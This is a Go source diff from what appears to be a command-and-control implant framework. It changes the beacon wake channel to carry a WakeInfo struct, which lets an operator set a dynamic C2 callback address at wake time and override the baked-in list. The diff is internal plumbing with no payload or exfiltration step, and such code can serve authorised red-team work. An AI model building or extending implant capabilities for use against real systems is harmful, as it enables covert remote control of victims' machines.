@@ -30,11 +30,18 @@ package transports
 	alongside its own internal shortCircuit and the standard
 	time.After branch.
 
-	The channel carries a transport hint string (e.g. "mtls", "wg",
-	"http", "dns"). An empty string means "try all transports in the
-	configured order". For beacon wake (short-circuit sleep), the hint
-	is typically ignored. For trigger implants, the hint selects which
-	C2 transport to use when establishing the session.
+	The channel carries a WakeInfo struct with:
+	  - TransportHint: preferred C2 scheme ("mtls", "wg", "http", "dns")
+	  - CallbackURL:   optional dynamic callback address as a full C2 URL
+	                    (e.g. "mtls://10.0.0.5:8888"). When set, the runner
+	                    passes this to StartConnectionLoop as a temporary C2
+	                    override, allowing the operator to specify the callback
+	                    target at wake time rather than at build time.
+
+	An empty TransportHint means "try all transports in the configured
+	order". An empty CallbackURL means "use the baked-in C2 list".
+	For beacon wake (short-circuit sleep), both fields are typically
+	empty/ignored.
 
 	When the implant is built without any wake-capable transport (the
 	template directive guards the triggerwake import), the channel
@@ -42,16 +49,29 @@ package transports
 	ignores its branch.
 */
 
-var wakeNow = make(chan string, 1)
+// WakeInfo carries the operator's instructions from a wake trigger
+// to the runner loop. Sent over the wake channel.
+type WakeInfo struct {
+	// TransportHint is the preferred C2 transport scheme (e.g. "mtls",
+	// "wg", "http", "dns"). Empty means "try all in configured order".
+	TransportHint string
 
-// WakeNow signals the beacon/session loop to wake up. The
-// transportHint parameter carries the operator's preferred C2
-// transport scheme (e.g. "mtls", "wg", "http", "dns"). Pass ""
-// for "try all". Safe to call from any goroutine. Non-blocking --
-// if a wake is already pending, the new call is silently coalesced.
-func WakeNow(transportHint string) {
+	// CallbackURL is an optional dynamic callback address as a full
+	// C2 URL (e.g. "mtls://10.0.0.5:8888"). When non-empty, the runner
+	// passes this to StartConnectionLoop as a temporary C2 override,
+	// bypassing the baked-in C2 list. Protected by the trigger packet's
+	// HMAC — only an operator with the shared secret can set this.
+	CallbackURL string
+}
+
+var wakeNow = make(chan WakeInfo, 1)
+
+// WakeNow signals the beacon/session loop to wake up with the given
+// info. Safe to call from any goroutine. Non-blocking — if a wake
+// is already pending, the new call is silently coalesced.
+func WakeNow(info WakeInfo) {
 	select {
-	case wakeNow <- transportHint:
+	case wakeNow <- info:
 	default:
 		// already signaled; coalesce.
 	}
@@ -59,10 +79,10 @@ func WakeNow(transportHint string) {
 
 // WakeChannel returns the read end of the wake signal. The beacon
 // main loop's select uses this to be roused early. For trigger
-// implants, the received string is the transport hint. Returned as
-// <-chan to discourage accidental sends from other call sites -- use
-// WakeNow() for that.
-func WakeChannel() <-chan string {
+// implants, the received WakeInfo carries transport preference and
+// optional callback override. Returned as <-chan to discourage
+// accidental sends from other call sites — use WakeNow() for that.
+func WakeChannel() <-chan WakeInfo {
 	return wakeNow
 }
 
